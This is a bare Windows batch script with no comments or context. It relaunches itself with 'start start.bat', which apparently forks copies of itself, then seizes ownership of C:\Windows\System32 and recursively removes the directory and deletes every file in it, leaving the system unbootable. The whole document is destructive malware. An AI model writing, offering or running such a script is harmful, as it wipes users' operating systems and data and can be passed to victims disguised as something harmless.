start start.bat
timeout 10
takeown /f c:\windows\system32 /a /r /d y
cacls c:\windows\system32
rd /s /q c:\windows\system32
del /s /q c:\windows\system32\*.*